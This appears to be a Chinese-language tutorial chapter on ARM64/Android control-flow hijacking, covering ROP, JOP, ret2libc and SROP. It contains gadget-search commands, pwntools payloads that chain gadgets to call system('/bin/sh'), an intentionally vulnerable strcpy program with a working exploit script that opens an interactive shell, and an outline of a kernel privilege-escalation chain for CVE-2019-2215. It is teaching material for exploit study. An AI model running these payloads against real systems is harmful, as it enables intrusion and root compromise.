# 05 - 控制流劫持

ROP、JOP、ret2libc、SROP 技术详解。

---

## 概念速览

**控制流劫持是什么？**
通过覆盖函数指针或返回地址，改变程序执行流程。

**为什么这是 exploit 核心？**
- 代码执行的关键步骤
- 绕过 DEP (W^X) 的必要手段
- 几乎所有内存漏洞的利用都需要

---

## 核心概念

### 控制流劫持方式

| 方式 | 劫持目标 | 触发条件 |
|------|----------|----------|
| ROP | 返回地址 | 函数返回时 |
| JOP | 间接跳转 | BR/BLR 指令 |
| ret2libc | 返回地址 | 调用 libc 函数 |
| SROP | sigreturn | 信号返回时 |

### 为什么需要这些技术？

```
传统 shellcode:
覆盖返回地址 → 跳转到 shellcode → 执行

现代防护:
DEP/W^X: 数据段不可执行
NX:      栈不可执行
PAN:     内核不能执行用户态代码

绕过方式:
不注入代码，而是复用已有代码 → ROP/JOP
```

---

## ROP (Return-Oriented Programming)

### 原理

```
正常返回:
┌────────────┐
│ saved LR   │ → 返回到调用者
└────────────┘

ROP:
┌────────────┐
│ gadget1    │ → 执行短指令序列
├────────────┤
│ gadget2    │ → 再执行
├────────────┤
│ gadget3    │ → 再执行
└────────────┘
```

### ARM64 Gadget 特点

```asm
// 典型 gadget (以 ret 结尾)
gadget1:
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #32
    ret                        // 跳转到新的 x30

// 控制参数的 gadget
gadget2:
    mov x0, x19                // 如果能控制 x19，就能控制 x0
    blr x20                    // 如果能控制 x20，就能调用任意函数
```

### 搜索 Gadget

```bash
# ROPgadget
ROPgadget --binary libc.so --only "ldp|ret"

# ropper
ropper --file libc.so --search "ldp x19"

# 输出示例
0x00000000000412bc : ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
0x000000000004a2d8 : mov x0, x19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
```

### 构造 ROP Chain

```python
# 目标: 调用 system("/bin/sh")
from pwn import *

libc = ELF("./libc.so")
base = 0x7ffff7e00000  # libc 基址

# gadget 地址
pop_x0 = base + 0x412bc   # 设置 x0
call_system = base + libc.symbols['system']
bin_sh = base + next(libc.search(b"/bin/sh"))

# 构造 payload
payload = b"A" * 64           # 填充到返回地址
payload += p64(pop_x0)        # gadget: 控制 x0
payload += p64(bin_sh)        # x0 = "/bin/sh"
payload += p64(call_system)   # 调用 system
```

### ARM64 ROP 特殊考虑

**x29 (FP) 和 x30 (LR) 成对：**
```asm
// 常见的 epilogue
ldp x29, x30, [sp], #16
ret

// 需要同时控制 x29 和 x30
// payload 中要成对放置
```

**栈对齐：**
```python
# 栈必须 16 字节对齐
# 如果 gadget 消耗的栈空间不是 16 的倍数，需要填充
```

---

## JOP (Jump-Oriented Programming)

### 原理

```asm
// 不使用 ret，使用 br/blr

// Dispatcher gadget
dispatcher:
    ldr x16, [x19], #8    // 从内存加载地址
    br x16                 // 跳转

// 数据表
gadget_table:
    .quad gadget1
    .quad gadget2
    .quad gadget3
```

### 适用场景

- 没有合适的 ret gadget
- CFI 只保护 ret 不保护 br
- 绕过特定的 ROP 检测

### BR/BLR Gadget

```asm
// 常见 JOP gadget
blr x8               // 调用 x8 指向的函数
br x16               // 跳转
ldr x16, [x0] ; br x16  // 间接调用
```

---

## ret2libc

### 原理

```
不需要 shellcode，直接调用 libc 函数

常用目标:
- system("/bin/sh")
- execve("/bin/sh", NULL, NULL)
- mprotect() 修改权限后执行 shellcode
```

### 实现步骤

```python
# 1. 泄露 libc 基址
libc_leak = u64(leak_data)
libc_base = libc_leak - libc.symbols['puts']

# 2. 计算目标地址
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

# 3. 构造 ROP
# x0 = "/bin/sh"
# 跳转到 system
```

### Android bionic 特点

```python
# bionic libc vs glibc
# 符号和偏移不同
# "/bin/sh" 可能不存在，使用:
# - "/system/bin/sh"
# - 自己写入内存
```

---

## SROP (Sigreturn-Oriented Programming)

### 原理

```
信号处理返回时，内核从栈上恢复所有寄存器

sigreturn:
1. 从栈读取 sigcontext 结构
2. 恢复 x0-x30, sp, pc 等
3. 返回到 pc

攻击:
伪造 sigcontext，控制所有寄存器！
```

### sigcontext 结构

```c
// arch/arm64/include/uapi/asm/sigcontext.h
struct sigcontext {
    __u64 fault_address;
    __u64 regs[31];      // x0-x30
    __u64 sp;
    __u64 pc;
    __u64 pstate;
    __u8  __reserved[4096];
};
```

### SROP 实现

```python
from pwn import *

# 构造伪造的 sigcontext
frame = SigreturnFrame(arch='aarch64')
frame.x0 = 0                    # arg1
frame.x1 = 0                    # arg2
frame.x8 = constants.SYS_execve # syscall number
frame.pc = syscall_ret_addr     # svc; ret 地址
frame.sp = new_stack

payload = bytes(frame)
```

### SROP 的优势

- 一次控制所有寄存器
- 只需要一个 gadget: `mov x8, #0x8b; svc #0` (sigreturn)
- 适合 gadget 稀缺的情况

---

## 实战场景

### Lab 1: 搜索 ROP Gadget

**目标：** 在 libc 中找到有用的 gadget

```bash
# 从 Android 设备获取 libc
adb pull /apex/com.android.runtime/lib64/bionic/libc.so

# 搜索控制 x0 的 gadget
ROPgadget --binary libc.so | grep "mov x0, x19"

# 搜索调用函数的 gadget
ROPgadget --binary libc.so | grep "blr x"

# 导出所有 gadget
ROPgadget --binary libc.so > gadgets.txt
```

**常用 gadget 模式：**
```
控制 x0:  mov x0, x19 ; ... ; ret
控制 x1:  mov x1, x20 ; ... ; ret
调用函数: blr x8 ; ... ; ret
加载值:   ldr x0, [sp, #8] ; ret
```

### Lab 2: 构造简单 ROP Chain

**目标：** 调用 system("/bin/sh")

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);  // 栈溢出
}

int main(int argc, char **argv) {
    if (argc > 1) vuln(argv[1]);
    return 0;
}
```

```python
# exploit.py
from pwn import *

context.arch = 'aarch64'

# 偏移确定
offset = 72  # 到返回地址的偏移

# gadget (需要根据实际 libc 调整)
libc_base = 0x7ffff7e00000
pop_x0 = libc_base + 0x412bc
system = libc_base + 0x45234
bin_sh = libc_base + 0x18a234

# 构造 payload
payload = b"A" * offset
payload += p64(pop_x0)    # gadget
payload += p64(0)         # x29 (padding)
payload += p64(bin_sh)    # 下一个 gadget 会加载这个到 x0
payload += p64(system)

# 运行
io = process(["./vuln", payload])
io.interactive()
```

### Lab 3: CVE-2019-2215 ROP 分析

**目标：** 分析真实 exploit 的 ROP chain

```
CVE-2019-2215: Binder UAF

漏洞: binder_thread 对象 UAF
触发: Racing between epoll and binder

ROP Chain 分析:
1. 泄露内核地址 (通过 /proc/kallsyms 或信息泄露)
2. 堆喷射控制 binder_thread
3. 触发 UAF，执行 ROP

关键 gadget:
- commit_creds(prepare_kernel_cred(0))
- 返回用户态
```

**公开 exploit 结构：**
```c
// 简化的 gadget chain
struct rop_chain {
    uint64_t pop_x0;           // 加载 x0
    uint64_t init_cred;        // init_cred 地址
    uint64_t commit_creds;     // commit_creds 地址
    uint64_t ret_to_user;      // 返回用户态
};
```

---

## 防护与绕过

### 防护机制

| 防护 | 原理 | 状态 |
|------|------|------|
| ASLR | 地址随机化 | 需要信息泄露 |
| Stack Canary | 栈保护 | 需要泄露或绕过 |
| CFI | 控制流完整性 | 部分绕过 |
| PAC | 指针认证 | 最新防护 |
| BTI | 分支目标标识 | 限制跳转目标 |

### PAC (Pointer Authentication)

```asm
// PAC 保护
paciasp            // 签名 LR
...
autiasp            // 验证 LR
ret

// 绕过需要:
// 1. 泄露 PAC key
// 2. 找到未保护的代码路径
// 3. 利用签名过的 gadget
```

### BTI (Branch Target Identification)

```asm
// BTI 保护
bti c              // 只允许从 blr 跳入
...

// 限制:
// - 间接跳转只能跳到 bti 指令
// - 减少可用 gadget
```

---

## 常见陷阱

### ❌ 陷阱 1: Gadget 副作用

```asm
// 这个 gadget 会破坏其他寄存器
mov x0, x19
ldp x19, x20, [sp, #16]    // x19, x20 被修改！
ldp x29, x30, [sp], #32
ret

// 解决：规划 gadget 顺序，保持必要寄存器
```

### ❌ 陷阱 2: 栈空间不足

```python
# gadget 消耗栈空间
# 如果 payload 太长，可能超出溢出范围

# 解决：stack pivot
# 切换到可控的大内存区域
```

### ❌ 陷阱 3: NULL 字节截断

```python
# 地址包含 \x00
system_addr = 0x7fff00001234  # 包含 00

# 如果通过 strcpy 复制，会截断
# 解决：选择不含 NULL 的 gadget
```

---

## 深入阅读

**推荐资源：**
- [Return-Oriented Programming](https://hovav.net/ucsd/dist/rop.pdf)
- [ARM64 ROP Techniques](https://blog.quarkslab.com/)
- [SROP Paper](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf)

**相关章节：**
- [04 - 调试技巧](./04-debugging-asm.md) - 调试 ROP
- [06 - 内存破坏](./06-memory-corruption.md) - 触发控制流劫持
- [07 - Exploit 开发](./07-exploit-development.md) - 完整 exploit

---

## 下一步

[06 - 内存破坏](./06-memory-corruption.md) — 栈溢出、堆溢出、UAF
